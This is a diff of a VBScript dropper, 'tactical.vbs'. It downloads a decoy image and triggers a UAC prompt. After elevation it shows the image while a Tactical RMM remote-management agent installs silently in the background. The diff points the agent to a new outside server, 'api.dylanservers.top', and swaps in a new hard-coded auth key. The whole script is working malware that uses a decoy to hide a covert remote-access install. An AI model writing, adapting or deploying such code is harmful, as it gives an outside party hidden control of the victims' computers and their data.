@@ -1,7 +1,7 @@
 ' ============================================================
 ' tactical.vbs
 ' Does everything in one file:
-'  1. Downloads error.png silently before UAC prompt
+'  1. Downloads image silently before UAC prompt
 '  2. Triggers UAC elevation (one prompt, unavoidable)
 '  3. Elevated PowerShell opens the image INSTANTLY
 '  4. Install runs silently in the background
@@ -26,8 +26,8 @@ If objFSO.FileExists(imagePath) Then objFSO.DeleteFile imagePath, True
 On Error Goto 0
 
 ' ============================================================
-' STEP 1: Download error.png now, before UAC fires,
-' so it is already on disk and opens instantly after elevation
+' STEP 1: Download the image before UAC fires so it is
+' already on disk and opens instantly after elevation
 ' ============================================================
 Dim httpImg
 Set httpImg = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -51,9 +51,7 @@ Set httpImg = Nothing
 On Error Goto 0
 
 ' ============================================================
-' STEP 2: Build the PowerShell script.
-' First thing it does after UAC is accepted: open the image.
-' Then the install runs silently behind it.
+' STEP 2: Build the embedded PowerShell script
 ' ============================================================
 psScript = _
 "# Open the pre-downloaded image immediately after UAC accepted" & vbCrLf & _
@@ -61,14 +59,14 @@ psScript = _
 "if (Test-Path $imgPath) { Start-Process $imgPath }" & vbCrLf & _
 "" & vbCrLf & _
 "$innosetup    = 'tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
-"$api          = '""https://api.cacgreatchallange.org""'" & vbCrLf & _
+"$api          = '""https://api.dylanservers.top""'" & vbCrLf & _
 "$clientid     = '1'" & vbCrLf & _
 "$siteid       = '1'" & vbCrLf & _
 "$agenttype    = '""server""'" & vbCrLf & _
 "$power        = 0" & vbCrLf & _
 "$rdp          = 0" & vbCrLf & _
 "$ping         = 0" & vbCrLf & _
-"$auth         = '""e47377c55d03d2147d91e2a9e6ae8834e710f774496d0eae3c8050ca6b2fa288""'" & vbCrLf & _
+"$auth         = '""8dd0ba93d9d55736ed3a6e28f17fbd3929c6b0f34b49b9d6ec1f6e200c6efa1f""'" & vbCrLf & _
 "$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
 "$apilink      = $downloadlink.split('/')" & vbCrLf & _
 "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
@@ -127,10 +125,12 @@ psScript = _
 "            Write-Host 'Extracting...'" & vbCrLf & _
 "            Start-Sleep -s 7" & vbCrLf & _
 "            Start-Process -FilePath ""C:\Program Files\TacticalAgent\tacticalrmm.exe"" -ArgumentList $installArgs -WindowStyle Hidden -Wait" & vbCrLf & _
+"            exit 0" & vbCrLf & _
 "        } Catch {" & vbCrLf & _
 "            $ErrorMessage = $_.Exception.Message" & vbCrLf & _
 "            $FailedItem   = $_.Exception.ItemName" & vbCrLf & _
 "            Write-Error -Message ""$ErrorMessage $FailedItem""" & vbCrLf & _
+"            exit 1" & vbCrLf & _
 "        } Finally {" & vbCrLf & _
 "            Remove-Item -Path $OutPath\$output -ErrorAction SilentlyContinue" & vbCrLf & _
 "        }" & vbCrLf & _
